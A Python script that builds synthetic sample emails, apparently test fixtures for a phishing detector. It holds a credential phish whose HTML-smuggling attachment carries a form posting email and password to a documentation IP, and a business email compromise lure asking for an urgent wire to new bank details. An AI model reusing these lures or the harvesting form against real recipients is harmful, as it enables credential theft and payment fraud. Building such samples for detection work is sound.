#!/usr/bin/env python3
"""Builds the synthetic sample emails (.eml). All domains use the reserved .example TLD and
all IPs are RFC 5737 documentation addresses. The 'malicious' attachment is inert demo HTML."""
import base64
from email.message import EmailMessage
from pathlib import Path

OUT = Path(__file__).resolve().parent


def received(frm, ip, by, when):
    return f"from {frm} ([{ip}]) by {by} with ESMTPS id 4XyZ{sum(map(ord, frm)) % 99999}; {when}"


# 1. Credential phish with HTML-smuggling attachment -------------------------------------------
m = EmailMessage()
m["Received"] = received("mx.corp.example", "10.10.0.25", "mailbox01.corp.example", "Tue, 27 Oct 2026 14:03:12 +0000")
m["Received"] = received("mail.c0rp.example", "203.0.113.45", "mx.corp.example", "Tue, 27 Oct 2026 14:03:09 +0000")
m["Authentication-Results"] = ("mx.corp.example; spf=pass smtp.mailfrom=c0rp.example; dkim=none; "
                               "dmarc=none header.from=c0rp.example")
m["Return-Path"] = "<bounce@c0rp.example>"
m["From"] = '"Corp IT Helpdesk" <helpdesk@c0rp.example>'
m["To"] = "staff-all@corp.example"
m["Subject"] = "Action Required: Payroll portal password expires today"
m["Date"] = "Tue, 27 Oct 2026 14:03:05 +0000"
m["Message-ID"] = "<20261027140305.77812@mail.c0rp.example>"
m.set_content("Your payroll portal password expires today. Verify your account within 24 hours to avoid "
              "interruption of direct deposit: https://c0rp-portal.example/login/verify?u=staff\n\nCorp IT Helpdesk")
m.add_alternative("""<html><body><p>Hello,</p>
<p>Your <b>payroll portal password expires today</b>. To avoid interruption of direct deposit, please
verify your account within 24 hours.</p>
<p><a href="https://c0rp-portal.example/login/verify?u=staff">https://portal.corp.example/payroll</a></p>
<p>The updated payroll form is attached.</p><p>Corp IT Helpdesk</p></body></html>""", subtype="html")
inner = '<h1>Session expired - sign in to view document</h1>'  # harmless demo payload
smuggle = f"""<!DOCTYPE html><html><head><title>Payroll_Update</title></head><body>
<script>var d = atob("{base64.b64encode(inner.encode()).decode()}"); document.write(d);</script>
<form method="POST" action="https://198.51.100.23/owa/auth.php">
  <input name="email" placeholder="Work email"><input name="pass" type="password"><button>View document</button>
</form></body></html>"""
m.add_attachment(smuggle.encode(), maintype="text", subtype="html", filename="Payroll_Update_Nov2026.pdf.html")
(OUT / "01_credential_phish.eml").write_bytes(bytes(m))

# 2. Business email compromise - vendor bank-change fraud ------------------------------------
m = EmailMessage()
m["Received"] = received("smtp.payflow-billing.example", "198.51.100.77", "mx.corp.example", "Wed, 28 Oct 2026 16:41:30 +0000")
m["Authentication-Results"] = ("mx.corp.example; spf=pass smtp.mailfrom=payflow-billing.example; "
                               "dkim=pass header.d=payflow-billing.example; dmarc=pass header.from=payflow-billing.example")
m["Return-Path"] = "<dana.whitfield@payflow-billing.example>"
m["From"] = '"Dana Whitfield" <dana.whitfield@payflow-billing.example>'
m["Reply-To"] = "dana.payflow@mail.example.net"
m["To"] = "accounts.payable@corp.example"
m["Subject"] = "RE: Invoice INV-20931 overdue - updated banking details"
m["Date"] = "Wed, 28 Oct 2026 16:41:22 +0000"
m["Message-ID"] = "<CAB12xyz@payflow-billing.example>"
m.set_content("""Hi team,

Following our audit, our bank details have changed. Please use the updated banking details below for
invoice INV-20931, which is now overdue, and process the wire transfer today.

New account number: 000123456789   Routing number: 011000015

Please keep this confidential until our finance team sends the formal notice.

Dana Whitfield
Accounts Receivable, PayFlow""")
(OUT / "02_bec_vendor_fraud.eml").write_bytes(bytes(m))

# 3. Legitimate internal newsletter (should score low) --------------------------------------
m = EmailMessage()
m["Received"] = received("relay01.corp.example", "10.10.0.30", "mailbox01.corp.example", "Thu, 29 Oct 2026 12:00:04 +0000")
m["Authentication-Results"] = ("mx.corp.example; spf=pass smtp.mailfrom=corp.example; dkim=pass header.d=corp.example; "
                               "dmarc=pass header.from=corp.example")
m["Return-Path"] = "<news@corp.example>"
m["From"] = '"Corp Communications" <news@corp.example>'
m["To"] = "staff-all@corp.example"
m["Subject"] = "Weekly update: volunteer day and new parking lot hours"
m["Date"] = "Thu, 29 Oct 2026 12:00:00 +0000"
m["Message-ID"] = "<weekly-2026-44@corp.example>"
m.set_content("Read this week's update on the intranet: https://intranet.corp.example/news/2026-44")
m.add_alternative('<p>Read this week\'s update on the <a href="https://intranet.corp.example/news/2026-44">intranet</a>.</p>',
                  subtype="html")
(OUT / "03_legit_newsletter.eml").write_bytes(bytes(m))
print("[+] samples written")
